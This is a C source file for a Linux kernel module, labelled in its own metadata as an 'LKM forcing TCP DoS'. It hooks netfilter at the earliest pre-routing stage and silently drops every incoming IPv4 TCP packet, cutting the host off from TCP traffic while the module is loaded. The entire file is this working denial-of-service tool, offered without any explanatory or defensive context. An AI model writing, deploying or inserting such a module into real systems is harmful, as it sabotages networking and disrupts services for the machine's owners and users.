#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/ip.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>

MODULE_AUTHOR("Nick Bulischeck");
MODULE_DESCRIPTION("LKM forcing TCP DoS");
MODULE_LICENSE("GPL");

static struct nf_hook_ops nfho;

unsigned int nfhook(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *)){
	struct iphdr *ip_header;

	ip_header = (struct iphdr *)skb_network_header(skb);
	if (!ip_header){
		return NF_ACCEPT;
	}

	if (ip_header->protocol == IPPROTO_TCP){
		kfree_skb(skb);
		return NF_STOLEN;
	}

	return NF_ACCEPT;
}

static int __init init_mod(void){
	int ret;

	nfho.hook = (nf_hookfn *) nfhook;
	nfho.hooknum = NF_INET_PRE_ROUTING;
	nfho.pf = PF_INET;
	nfho.priority = NF_IP_PRI_FIRST;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
	ret = nf_register_net_hook(&init_net, &nfho);
#else
	ret = nf_register_hook(&nfho);
#endif

	return ret;
}

static void __exit exit_mod(void){
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
	nf_unregister_net_hook(&init_net, &nfho);
#else
	nf_unregister_hook(&nfho);
#endif
}

MODULE_LICENSE("GPL");

module_init(init_mod);
module_exit(exit_mod);
